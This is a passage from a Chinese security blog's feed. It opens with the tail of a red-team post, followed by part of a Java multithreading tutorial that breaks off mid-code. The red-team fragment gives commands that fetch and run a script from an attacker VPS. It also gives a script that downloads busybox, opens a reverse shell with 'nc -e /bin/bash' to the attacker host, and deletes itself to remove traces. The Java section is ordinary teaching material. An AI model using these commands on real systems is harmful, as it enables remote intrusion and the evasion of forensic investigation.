80</span><br></pre></td></tr></table></figure><p>​    VPS上nc开启监听:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>​    目标机器内存shell执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://x.x.x.x/1 -o /tmp/1</span><br><span class="line">/bin/bash /tmp/1    <span class="comment">#建议放到临时目录</span></span><br></pre></td></tr></table></figure><p>​    此处我们看一下curl的用法，所以此时我们不指定为/tmp/1，如果指定为1.sh这样的话，就会直接在当前目录下生成文件。同理，我们如果在拿到shell的情况下，用这个办法变可以写一个🐎上去，而路径及为当前的web路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -o 参数将服务器的回应保存成文件，等同于 wget 命令。</span></span><br><span class="line">curl -o example.html https://www.example.com</span><br><span class="line"><span class="comment">#上面命令将 www.example.com 保存成 example.html 。</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -O 参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。</span></span><br><span class="line">curl -O https://www.example.com/foo/bar.html</span><br><span class="line"><span class="comment">#上面命令将服务器回应保存成文件，文件名为bar.html。</span></span><br></pre></td></tr></table></figure><h4 id="2、busybox"><a href="#2、busybox" class="headerlink" title="2、busybox"></a>2、busybox</h4><p>​    然后我们就发现，目标没得bash，或者bash权限执行不了，要寄了？采用nc链接，可是目标机器并没有安装nc，所以这时候用到工具 busybox ，集成了linux常用命令和工具。</p><p>​    首先先在自己的VPS上把这busybox下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/binaries/1.20.0/busybox-x86_64</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>​    vps脚本2（这个脚本2也要放到同级目录下并与busybox一起映射到80服务上）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f /tmp/busybox ];<span class="keyword">then</span>  <span class="comment">#判断当前机器tmp目录是否以安装busybox</span></span><br><span class="line">wget http://x.x.x.x/busybox-x86_64 -O /tmp/busybox  <span class="comment">#从VPS80端口下载busybox 到tmp目录并取名busybox</span></span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/busybox <span class="comment"># 添加一个执行权限</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">/tmp/busybox nc x.x.x.x 9999 -e /bin/bash &amp;  <span class="comment">#用nc连接 9999端口</span></span><br><span class="line"><span class="built_in">sleep</span> 2  <span class="comment">#延迟时间最好不要动</span></span><br><span class="line"><span class="built_in">rm</span> /tmp/busybox  <span class="comment">#删除busybox</span></span><br><span class="line"><span class="built_in">rm</span> <span class="variable">$0</span>  <span class="comment">#删除当前脚本</span></span><br></pre></td></tr></table></figure><p>​    vps开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure><p>​    目标内存shell执行,让目标机器从VPS上下载脚本2并且执行脚本2的内容并且回弹nc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://x.x.x.x/2 -o /tmp/2</span><br><span class="line">/bin/bash /tmp/2</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074309.jpg"                      alt="image-20220901223831200"                ></p><h4 id="3、"><a href="#3、" class="headerlink" title="3、"></a>3、</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;防蜜罐插件&quot;&gt;&lt;a href=&quot;#防蜜罐插件&quot; class=&quot;headerlink&quot; title=&quot;防蜜罐插件&quot;&gt;&lt;/a&gt;防蜜罐插件&lt;/h3&gt;&lt;p&gt;​    蜜罐：&lt;/p&gt;
&lt;p&gt;​    1.配置jsonp接口信息&lt;/p&gt;
&lt;p&gt;​    2.配置蜜罐网站信息&lt;</summary>
      
    
    
    
    <category term="红色tips" scheme="http://example.com/categories/%E7%BA%A2%E8%89%B2tips/"/>
    
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
    <category term="防溯源" scheme="http://example.com/tags/%E9%98%B2%E6%BA%AF%E6%BA%90/"/>
    
    <category term="痕迹清理" scheme="http://example.com/tags/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Java安全从零到一(3)-Java高级编程</title>
    <link href="http://example.com/2022/08/04/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-3-Java%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"/>
    <id>http://example.com/2022/08/04/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-3-Java%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/</id>
    <published>2022-08-04T08:32:43.000Z</published>
    <updated>2023-04-23T17:12:17.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Java多线程编程"><a href="#Java多线程编程" class="headerlink" title="Java多线程编程"></a>Java多线程编程</h3><p>​    在Java语言里面最大的特点是支持多线程的开发(也是为数不多支持多线程的编程语言)，所以在整个的JAVA技术的学习里面，如果你不能够对多线程的概念有一个全面并且细致的了解，则在日后进行一些项目设计的过程之中是并发访问设计的过程之中就会出现严重的技术缺陷。</p><h4 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h4><p>​    进程的概念：</p><p>​    在传统的DOS系统的时代，其本身有一个特征：如果你电脑上出现了病毒，那么所有的程序将无法执行，因为传统的DOS采用的是单进程处理，而单进程处理的最大特点：在同一个时间段上只允许一个程序在执行。</p><p>​    后来到了Windows 的时代就开启了多进程的设计，于是就表示<strong>在一个时间段上可以同时运行多个程序，并且这些程序将进行资源的轮流抢占。所以在同一个时间段上会有多个程序依次执行，但是在同一个时间点上只会有一个进程执行</strong>。而后来到了多核的CPU，由于可以处理的CPU多了，那么即便有再多的进程出现，也可以比单核CPU处理的速度有所提升。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073753.jpg"                      alt="image-20220804175018292"                ></p><p>​    线程的概念：</p><p>​    线程是在进程基础之上划分的更小的程序单元，线程是在进程基础上创建并且使用的，所以线程依赖于进程的支持，但是<strong>线程的启动速度要比进程快很多，所以当使用多线程进行并发处理的时候，其执行的性能要高于进程</strong>。</p><p>​    Java是多线程的编程语言，所以Java在进行并发访问处理的时候可以得到更高的处理性能。</p><h4 id="Thread-类实现多线程"><a href="#Thread-类实现多线程" class="headerlink" title="Thread 类实现多线程"></a>Thread 类实现多线程</h4><p>​    如果要想在 Java 之中实现多线程的定义，那么就需要有一个专门的线程主体类进行线程的执行任务的定义，而这个主体类的定义是有要求的，必须实现特定的接口或者继承特定的父类才可以完成。</p><p>​    继承 Thread 类实现多线程：</p><p>​    <strong>Java 里面提供有一个 java.lang.Thread 的程序类，那么一个类只要继承了此类就表示这个类为线程的主体类。但是并不是说这个类就可以直接实现多线程处理了，因为还需要覆写 Thread 类中提供的一个 run(public void run()）方法，而这个方法就属于线程的主方法。</strong></p><p>范例：多线程主体类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123; <span class="comment">//线程的主体类</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyThread</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123; <span class="comment">//线程的主体方法</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123;</span><br><span class="line">            System.out.println(<span class="built_in">this</span>.title + <span class="string">&quot;运行，x=&quot;</span> + x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>多线程要执行的功能都应该在 run()方法中进行定义</strong>。</p><p>​    需要说明的是：在正常情况下如果要想使用一个类中的方法，那么肯定要产生实例化对象，而后去调用类中提供的方法，但是 <strong>run()方法是不能够被直接调用的</strong>，因为这里面牵扯到一个操作系统的资源调度问题，所以<strong>要想启动多线程必须使用start() 方法完成（public void start()）</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">MyThread</span>(<span class="string">&quot;线程A&quot;</span>).run();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">MyThread</span>(<span class="string">&quot;线程B&quot;</span>).run();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">MyThread</span>(<span class="string">&quot;线程C&quot;</span>).run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073754.jpg"                      alt="image-20220805155405318"                ></p><p>​    我们这么调用一下，可以发现是顺序执行，并没有交替执行。</p><p>范例：多线程启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//thread类实现多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123; <span class="comment">//线程的主体类</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyThread</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123; <span class="comment">//线程的主体方法</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123;</span><br><span class="line">            System.out.printf(<span class="built_in">this</span>.title + <span class="string">&quot;运行，x=&quot;</span> + x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MyThread</span>(<span class="string">&quot;线程A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MyThread</span>(<span class="string">&quot;线程B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MyThread</span>(<span class="string">&quot;线程C&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073755.jpg"                      alt="image-20220805155559911"                ></p><p>​    通过此时的调用可以发现，虽然调用了是 start()方法，但是最终执行的是 run()方法，并且所有的线程对象都是交替执行的。执行顺序不可控。</p><p>start方法分析</p><p>​    <strong>为什么多线程的启动不直接使用 run() 方法而必须使用 Thread 类中的 start()方法呢</strong>？如果要想清楚这个问题，最好的做法是查看一下 start() 方法的实现操作，可以直接通过源代码观察。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (threadStatus != <span class="number">0</span>) <span class="comment">//判断线程状态</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalThreadStateException</span>(); <span class="comment">//抛出一个异常</span></span><br><span class="line"></span><br><span class="line">    group.add(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">started</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        start0(); <span class="comment">//在start()方法里调用了start0()方法</span></span><br><span class="line">        started = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!started) &#123;</span><br><span class="line">                group.threadStartFailed(<span class="built_in">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ignore) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">start0</span><span class="params">()</span>;<span class="comment">//只定义了方法名称，没有实现</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (target != <span class="literal">null</span>) &#123;</span><br><span class="line">        target.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    发现在 start() 方法里面会抛出一个“IllegalThreadStateException”异常类对象，但是整个的程序并没有使用 throws 或者是明确的 try..catch 处理，因为该异常一定是 RuntimeException 的子类，每一个线程类的对象只允许启动一次,如果重复启动则就抛出此异常。</p><p>范例：会抛出异常的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">MyThread</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>(<span class="string">&quot;线程A&quot;</span>);</span><br><span class="line">    mt.start();</span><br><span class="line">    mt.start(); <span class="comment">//重复启动线程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073756.jpg"                      alt="image-20220805160746947"                ></p><p>​    <strong>在 Java 程序执行的过程之中考虑到对于不同层次开发者的需求，所以其支持有本地的操作系统函数调用，而这项技术就被称为 JNI（Java Native Inteface）Java本地接口技术，但是 Java 开发过程之中并不推荐这样使用，利用这项技术可以使用一些操作系统提供底层函数进行一些特殊的处理，而在 Thread 类里面提供的 start0()就表示需要将此方法依赖于不同的操作系统实现。</strong></p><p>Thread执行分析</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073757.jpg"                      alt="image-20220805173857042"                ></p><p>​    任何情况下，只要定义了多线程，多线程的启动永远只有一种方案:Thread 类中的start()方法。</p><h4 id="Runnable接口实现多线程"><a href="#Runnable接口实现多线程" class="headerlink" title="Runnable接口实现多线程"></a>Runnable接口实现多线程</h4><p>​    虽然可以通过Thread类的继承来实现多线程的定义，但是在Java程序里面对于继承永远都是存在有单继承局限的，所以在JAVA里面又提供有第二种多线程的主体定义结构形式:实现java.lang.Runnable接口，此接口定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span>  <span class="comment">//从JDK1.8引入了Lambda表达式之后就变为了函数式接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：通过Runnable实现多线程的主体类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread1</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123; <span class="comment">//主体类</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyThread1</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123; <span class="comment">//线程的主体方法</span></span><br><span class="line">            System.out.printf(<span class="built_in">this</span>.title + <span class="string">&quot;运行，x =&quot;</span> + x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    但是此时由于不再继承Thread父类了，那么对于此时的MyThread类中也就不再支持有start()这个继承的方法，可是如果不使用Thread.start()方法是无法进行多线程启动的，那么就需要去观察一下Thread类所提供的构造方法。</p><p>​    构造方法: public Thread(Runnable target);</p><p>范例：启动多线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Runnable接口多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread1</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123; <span class="comment">//主体类</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyThread1</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123; <span class="comment">//线程的主体方法</span></span><br><span class="line">            System.out.printf(<span class="built_in">this</span>.title + <span class="string">&quot;运行，x =&quot;</span> + x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">threadA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyThread1</span>(<span class="string">&quot;线程对象A&quot;</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">threadB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyThread1</span>(<span class="string">&quot;线程对象B&quot;</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">threadC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyThread1</span>(<span class="string">&quot;线程对象C&quot;</span>));</span><br><span class="line">        threadA.start();</span><br><span class="line">        threadB.start();</span><br><span class="line">        threadC.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    多线程实现里面可以发现，由于只是实现了Runnable 接口对象，所以此时线程主体类上就不再有单继承局限了，这样的设计才是一个标准型的设计。</p><p>​    可以发现从JDK1.8开始，Runnable接口使用了函数式接口定义，所以也可以直接利用Lambda表达式进行线程类实现。</p><p>范例:利用Lambda实现多线程定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">3</span>; x++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;线程对象-&quot;</span> + x;</span><br><span class="line">            <span class="type">Runnable</span> <span class="variable">run</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">0</span>; y &lt; <span class="number">10</span>; y++) &#123;</span><br><span class="line">                    System.out.println(title + <span class="string">&quot;运行，y =&quot;</span> + y);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(run).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">3</span>; x++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;线程对象-&quot;</span> + x;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">0</span>; y &lt; <span class="number">10</span>; y++) &#123;</span><br><span class="line">                    System.out.println(title + <span class="string">&quot;运行，y =&quot;</span> + y);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073758.jpg"                      alt="image-20220805221135835"                ></p><p>​    在以后的开发之中对于多线程的实现，优先考虑Runnable接口实现，并且永恒都是通过Thread类对象启动多线程。</p><h4 id="Thread与Runnable关系"><a href="#Thread与Runnable关系" class="headerlink" title="Thread与Runnable关系"></a>Thread与Runnable关系</h4><p>​    经过一系列的分析之后可以发现，在多线程的实现过程之中已经有了两种做法:Thread 类、Runnable 接口，如果从代码的结构本身来讲肯定使用 Runnable 是最方便的，因为其可以避免单继承的局限，同时也可以更好的进行功能的扩充。</p><p>​    但是从结构上也需要来观察 Thread 与 Runnable 的联系。</p><p>​    打开 Thread 类的定义:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Thread</span> <span class="keyword">extends</span> <span class="title class_">Object</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>​    发现现在 Thread 类也是 Runnable,接口的子类，那么在之前继承 Thread 类的时候实际上覆写的还是 Runnable 接口的 run() 方法，于是此时来观察一下程序的类结构。</p><p>以这个程序为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span 